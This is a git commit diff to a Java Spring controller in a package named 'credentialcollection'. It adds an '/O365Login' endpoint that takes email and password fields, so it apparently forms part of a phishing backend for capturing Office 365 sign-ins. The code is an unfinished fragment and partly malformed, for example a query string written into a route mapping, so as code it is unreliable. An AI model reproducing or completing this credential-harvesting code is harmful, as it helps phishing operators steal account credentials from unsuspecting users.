c6f2bfae8bd8c85e19e83f962bb81a373773ae4b
pablo-chacon <58485004+pablo-chacon@users.noreply.github.com>
2022-01-13 14:34:42 +0100

    Update CredentialController.java
    work in progress client side controller

--- CredentialController.java
+++ CredentialController.java
@@ -2,22 +2,20 @@ package com.example.credentialcollection;
 
 import org.springframework.stereotype.Controller;
 import org.springframework.ui.Model;
-import org.springframework.web.bind.annotation.GetMapping;
-import org.springframework.web.bind.annotation.ModelAttribute;
-import org.springframework.web.bind.annotation.PostMapping;
+import org.springframework.web.bind.annotation.*;
 
 @Controller
 public class CredentialController {
 
-    @GetMapping("/TargetHost/target")
+    @GetMapping("/TargetPost/{target}")
     public String getCredentials(Model model) {
-        model.addAttribute("credentials", new TargetHost());
-        return "credentials";
+        model.addAttribute("target", new TargetPost());
+        return "target";
     }
 
-    @PostMapping("/O365Login")
-    public String postCredentials(@ModelAttribute TargetHost target, Model model) {
+    @PostMapping("/O365Login?id=email&content=password")
+    public TargetPost postCredentials(@ModelAttribute TargetPost target, Model model) {
         model.addAttribute("target", target);
-        return "target";
+        return target;
     }
 }
